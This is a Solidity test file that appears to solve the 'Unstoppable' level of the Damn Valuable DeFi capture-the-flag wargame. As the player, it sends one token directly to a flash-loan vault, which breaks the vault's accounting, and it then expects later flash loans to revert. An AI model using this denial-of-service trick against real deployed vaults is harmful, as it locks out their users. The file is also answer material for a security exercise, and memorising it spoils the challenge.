//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/Unstoppable/ReceiverUnstoppable.sol";
import "../src/DamnValuableToken.sol";

contract UnstoppableTest is DSTest {
    uint256 constant TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 constant INITIAL_PLAYER_BALANCE = 10 ether;
    Vm private constant vm = Vm(HEVM_ADDRESS);

    address deployer = address(uint160(uint256(keccak256("DEPLOYER"))));
    address player = address(uint160(uint256(keccak256("PLAYER"))));
    address someUser = address(uint160(uint256(keccak256("SOME_USER"))));

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;

    function setUp() public {
        vm.startPrank(deployer);
        token = new DamnValuableToken();
        vault = new UnstoppableVault(
            token,
            address(deployer),
            address(deployer)
        );

        assertEq(address(vault.asset()), address(token));

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000 ether);

        token.transfer(player, INITIAL_PLAYER_BALANCE);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_BALANCE);
        vm.stopPrank();

        vm.startPrank(someUser);

        receiver = new ReceiverUnstoppable(address(vault));
        receiver.executeFlashLoan(100 ether);

        vm.stopPrank();
    }

    function testIsUnstoppablePassed() public {
        // Solving the puzzle as the player
        vm.startPrank(player);

        token.transfer(address(vault), 1);

        vm.stopPrank();

        // Checking if executeFlashLoan() fails or not, failing to execute means success!
        vm.startPrank(someUser);

        vm.expectRevert();
        receiver.executeFlashLoan(100 ether);

        vm.stopPrank();
    }
}
